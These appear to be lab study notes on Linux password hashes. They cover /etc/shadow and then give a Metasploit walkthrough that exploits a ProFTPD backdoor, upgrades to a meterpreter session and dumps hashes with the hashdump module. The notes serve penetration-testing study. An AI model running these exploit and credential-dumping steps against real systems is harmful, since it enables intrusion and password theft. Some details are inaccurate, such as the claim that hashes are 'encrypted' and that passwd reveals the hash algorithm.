# Dumping Linux Passwort Hashes


## Linux Password Hashes
- Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.
- All of the information for all accounts on Linux is stored in the passwd file located in /etc/passwd
- We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the systen.
- All the encrypted passwords for the users are stored in the shadow file. It can be found in the following directory: /etc/shadow
- The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.

  - The passwd file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol ($)

![image](https://github.com/user-attachments/assets/e49a471f-b98a-4efb-82d5-f2b74c1a8789)

## Demo: Linux Password Hashes

We first exploit the target:

`ifconfig, eth1`

`nmap -sV [targetIP]`

We check if this version of proftpd is vulnerable to a exploit:

`searchsploit PROFTPD`

We got a Backdoor Command Execution module

`service postgresql start && msfconsole`

`setg rhosts [targetIP]`

`search proftpd`

We want the proftpd_133c_backdoor:

use [module name]

`show options`

`exploit`

We get a command shell session:

`/bin/bash -i`

`id`

We put this session in the background: CTRL + Z

`yes`

`sessions`

We upgrade our session to a meterpreter session:

`sessions -u 1`

we get a error, but thats fine

`sessions`

`sysinfo`

`getuid`

We have successfully obtained a meterpreter session.

`cat etc/shadow/`

Another technique is the metasploit hashdump module.

CTRL + Z to put the session in the background

`search hashdump`

We copy post/linux/gather/hashdump

`use post/linux/gather/hashdump`

`set SESSION 2` (our meterpreter session)

`run`

This will get the user accs that have passwords and gives us the hashed passwords and saves them.



